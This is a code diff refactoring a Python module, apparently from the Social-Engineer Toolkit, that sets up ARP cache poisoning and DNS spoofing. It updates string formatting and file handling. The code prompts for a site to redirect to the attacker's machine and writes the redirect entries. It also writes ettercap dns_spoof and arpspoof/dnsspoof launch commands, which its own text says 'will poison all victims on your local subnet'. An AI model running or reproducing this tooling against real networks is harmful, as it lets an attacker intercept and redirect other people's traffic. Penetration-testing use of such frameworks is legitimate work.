@@ -21,36 +21,26 @@ ettercapchoice = 'n'
 # add dsniffchoice
 dsniffchoice = 'n'
 for line in config:
-    # check for ettercap choice here
-    match1 = re.search("ETTERCAP=ON", line)
-    if match1:
-        print_info("ARP Cache Poisoning is set to " +
-                   bcolors.GREEN + "ON" + bcolors.ENDC)
+    if match1 := re.search("ETTERCAP=ON", line):
+        print_info(f"ARP Cache Poisoning is set to {bcolors.GREEN}ON{bcolors.ENDC}")
         ettercapchoice = 'y'
 
-    # check for dsniff choice here
-    match2 = re.search("DSNIFF=ON", line)
-    if match2:
-        print_info("DSNIFF DNS Poisoning is set to " +
-                   bcolors.GREEN + "ON" + bcolors.ENDC)
+    if match2 := re.search("DSNIFF=ON", line):
+        print_info(f"DSNIFF DNS Poisoning is set to {bcolors.GREEN}ON{bcolors.ENDC}")
         dsniffchoice = 'y'
         ettercapchoice = 'n'
 
 # GRAB CONFIG from SET
 fileopen = open("/etc/setoolkit/set.config", "r").readlines()
 for line in fileopen:
-    # grab the ettercap interface
-    match = re.search("ETTERCAP_INTERFACE=", line)
-    if match:
+    if match := re.search("ETTERCAP_INTERFACE=", line):
         line = line.rstrip()
         interface = line.split("=")
         interface = interface[1]
         if interface == "NONE":
             interface = ""
 
-    # grab the ettercap path
-    etterpath = re.search("ETTERCAP_PATH=", line)
-    if etterpath:
+    if etterpath := re.search("ETTERCAP_PATH=", line):
         line = line.rstrip()
         path = line.replace("ETTERCAP_PATH=", "")
 
@@ -65,11 +55,10 @@ if ettercapchoice == 'y':
         ipaddr = check_options("IPADDR=")
     else:
         ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
-        update_options("IPADDR=" + ipaddr)
+        update_options(f"IPADDR={ipaddr}")
 
-    if ettercapchoice == 'y':
-        try:
-            print("""
+    try:
+        print("""
   This attack will poison all victims on your local subnet, and redirect them
   when they hit a specific website. The next prompt will ask you which site you
   will want to trigger the DNS redirect on. A simple example of this is if you
@@ -80,41 +69,38 @@ if ettercapchoice == 'y':
 
   IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
 """)
-            print_info("Example: http://www.google.com")
-            dns_spoof = raw_input(
-                setprompt("0", "Site to redirect to attack machine [*]"))
-            os.chdir(path)
-            # small fix for default
-            if dns_spoof == "":
-                # set default to * (everything)
-                dns_spoof = "*"
-            # remove old stale files
-            subprocess.Popen(
-                "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
-            # prep etter.dns for writing
-            filewrite = open("etter.dns", "w")
+        print_info("Example: http://www.google.com")
+        dns_spoof = raw_input(
+            setprompt("0", "Site to redirect to attack machine [*]"))
+        os.chdir(path)
+        # small fix for default
+        if dns_spoof == "":
+            # set default to * (everything)
+            dns_spoof = "*"
+        # remove old stale files
+        subprocess.Popen(
+            "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
+        with open("etter.dns", "w") as filewrite:
             # send our information to etter.dns
-            filewrite.write("%s A %s" % (dns_spoof, ipaddr))
-            # close the file
-            filewrite.close()
-            # set bridge variable to nothing
-            bridge = ""
-            # assign -M arp to arp variable
-            arp = "-M arp"
-            print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
-            # spawn a child process
-            os.chdir(cwd)
-            time.sleep(5)
-            filewrite = open(userconfigpath + "ettercap", "w")
+            filewrite.write(f"{dns_spoof} A {ipaddr}")
+        # set bridge variable to nothing
+        bridge = ""
+        # assign -M arp to arp variable
+        arp = "-M arp"
+        print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
+        # spawn a child process
+        os.chdir(cwd)
+        time.sleep(5)
+        with open(f"{userconfigpath}ettercap", "w") as filewrite:
             filewrite.write(
-                "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
-            filewrite.close()
-            os.chdir(cwd)
-        except Exception as error:
-            os.chdir(cwd)
-            # log(error)
-            print_error("ERROR:An error has occured:")
-            print("ERROR:" + str(error))
+                f"ettercap -T -q -i {interface} -P dns_spoof {arp} {bridge} // //"
+            )
+        os.chdir(cwd)
+    except Exception as error:
+        os.chdir(cwd)
+        # log(error)
+        print_error("ERROR:An error has occured:")
+        print(f"ERROR:{str(error)}")
 
 # if we are using dsniff
 if dsniffchoice == 'y':
@@ -124,11 +110,10 @@ if dsniffchoice == 'y':
         ipaddr = check_options("IPADDR=")
     else:
         ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
-        update_options("IPADDR=" + ipaddr)
+        update_options(f"IPADDR={ipaddr}")
 
-    if dsniffchoice == 'y':
-        try:
-            print("""
+    try:
+        print("""
   This attack will poison all victims on your local subnet, and redirect them
   when they hit a specific website. The next prompt will ask you which site you
   will want to trigger the DNS redirect on. A simple example of this is if you
@@ -139,39 +124,38 @@ if dsniffchoice == 'y':
 
   IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
 """)
-            print_info("Example: http://www.google.com")
-            dns_spoof = raw_input(
-                setprompt("0", "Site to redirect to attack machine [*]"))
-            # os.chdir(path)
-            # small fix for default
-            if dns_spoof == "":
-                dns_spoof = "*"
-            subprocess.Popen(
-                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (userconfigpath), shell=True).wait()
-            filewrite = open(userconfigpath + "dnsspoof.conf", "w")
-            filewrite.write("%s %s" % (ipaddr, dns_spoof))
-            filewrite.close()
-            print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
-            # spawn a child process
-            os.chdir(cwd)
-            # time.sleep(5)
-            # grab default gateway, should eventually replace with pynetinfo
-            # python module
-            gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
-                interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
-            # open file for writing
-            filewrite = open(userconfigpath + "ettercap", "w")
+        print_info("Example: http://www.google.com")
+        dns_spoof = raw_input(
+            setprompt("0", "Site to redirect to attack machine [*]"))
+        # os.chdir(path)
+        # small fix for default
+        if dns_spoof == "":
+            dns_spoof = "*"
+        subprocess.Popen(
+            f"rm {userconfigpath}/dnsspoof.conf 1> /dev/null 2> /dev/null",
+            shell=True,
+        ).wait()
+        with open(f"{userconfigpath}dnsspoof.conf", "w") as filewrite:
+            filewrite.write(f"{ipaddr} {dns_spoof}")
+        print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
+        # spawn a child process
+        os.chdir(cwd)
+        # time.sleep(5)
+        # grab default gateway, should eventually replace with pynetinfo
+        # python module
+        gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
+            interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
+        with open(f"{userconfigpath}ettercap", "w") as filewrite:
             # write the arpspoof / dnsspoof commands to file
             filewrite.write(
-                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, userconfigpath))
-            # close the file
-            filewrite.close()
-            # change back to normal directory
-            os.chdir(cwd)
-            # this is needed to keep it similar to format above for web gui
-            # mode
-            pause = raw_input("Press <return> to begin dsniff.")
-        except Exception as error:
-            os.chdir(cwd)
-            print_error("ERROR:An error has occurred:")
-            print(bcolors.RED + "ERROR" + str(error) + bcolors.ENDC)
+                f"arpspoof {gateway} | dnsspoof -f {userconfigpath}/dnsspoof.conf"
+            )
+        # change back to normal directory
+        os.chdir(cwd)
+        # this is needed to keep it similar to format above for web gui
+        # mode
+        pause = raw_input("Press <return> to begin dsniff.")
+    except Exception as error:
+        os.chdir(cwd)
+        print_error("ERROR:An error has occurred:")
+        print(f"{bcolors.RED}ERROR{str(error)}{bcolors.ENDC}")
